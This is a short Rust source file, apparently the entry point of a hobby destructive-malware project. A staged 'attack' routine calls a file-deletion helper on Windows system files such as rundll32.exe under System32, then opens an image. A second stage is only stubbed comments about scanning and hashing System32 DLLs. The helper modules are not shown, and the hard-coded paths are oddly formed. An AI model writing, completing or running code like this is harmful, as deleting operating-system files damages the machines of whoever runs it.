mod utils;
mod del_file;
mod img;
struct Phase{
    first: u8,
    second: u8,
    last: u8,
}

impl Phase {
    fn new() -> Self{
        Phase { first: 0,second: 0, last: 0 }
    }

    fn first_attack(self) -> Self{
        // # 1
        // rundll
        del_file::init_delete_file("/C:/Windows/System32/rundll32.exe");
        // system32 
        del_file::init_delete_file("/C:/Windows/System32.dll");

        // # 1 - end
        img::open();

        Self::done_first(self)
    }

    fn second_attack(self) -> Self{
        // https://github.com/dongsub-joung/rust_CLI/blob/main/file_hashing_cli/src/main.rs
        // search some *.dll files in sys32 -> save a .txt file 

        // read a file than for 

        // for - hashing

        // for - save

        // end

        self.done_sencond()
    }
    
    fn done_first(mut self) -> Self{
        self.first= 1;
        self
    }
     
    fn done_sencond(mut self) -> Self{
        self.second= 1;
        self
    }
     
    fn done_last(mut self) -> Self{
        self.last= 1;
        self
    }
}

fn main() {
    let mut code= Phase::new();

    utils::show_logo();

    code= Phase::first_attack(code);
    code= Phase::second_attack(code);
    code.done_last();
    
    utils::print_time();
    utils::done();
}